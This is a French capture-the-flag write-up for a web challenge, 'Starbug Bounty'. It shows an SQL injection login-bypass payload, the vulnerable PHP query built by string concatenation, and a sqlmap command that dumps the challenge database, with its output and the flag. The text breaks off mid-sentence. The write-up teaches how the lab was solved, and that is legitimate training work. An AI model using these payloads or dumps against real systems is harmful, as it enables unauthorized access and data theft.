# Web 100 - Starbug Bounty

On détecte une simple injection SQL, il est donc possible de contourner l’authentification avec le
payload suivant.
> Username : ‘ or 1<2 --
> Password : peu importe


En injectant le payload dans le champ “username” de la requête 1 la condition devient vraie et le reste de
la requête est ignorée car elle est précédée d’un commentaire.

>1 - $stmt = $pdo->query("SELECT
password='".$_POST['password']."'");
*
FROM
users
WHERE
username='".$_POST['username']."'
and

> 2 - $stmt = $pdo->query("SELECT * FROM users WHERE username='' or 1<2 --' and password='".$_POST['password']."'");


Nous sommes connectés sur l’interface et nous pouvons donc utiliser le flag qui nous est donné :
**ese{Auth_SqL_1s_s0000_w34k}**




Il était aussi possible d’utiliser SQLMap pour extraire le contenu de la base de données et ensuite se
connecter avec les identifiants récupérés.
> python
sqlmap.py
-u
'http://127.0.0.1/ESE-Epreuves/ESE%20Web%2002%20-
%20Starbug%20Bounty%20-%20Max/Epreuve/' --forms --dbms sqlite --dump

En fournissant les bonnes options à SQLmap telles que le type de base de données, ici SQLITE, on peut
détecter une injection SQL de type UNION. Avec l’option “dump”, l’outil va automatiquement récupérer
toute la base de données.

**Attention** : SQLMap est un outil assez intrusif, à la fin du CTF nous avions plus de 10 GO de logs sur la
machines hébergeant les challenges.

>Database: SQLite_masterdb
>
>Table: users [3 entries]
>
>+----+----------+------------------------+
>
>| id | username | password|
>
>+----+----------+------------------------+
>
>| 1 | admin | Auth_SqL_1s_s0000_w34k |
>
>+----+----------+------------------------+
>
SQLMap nous ressort la base de données et on peut utiliser les iden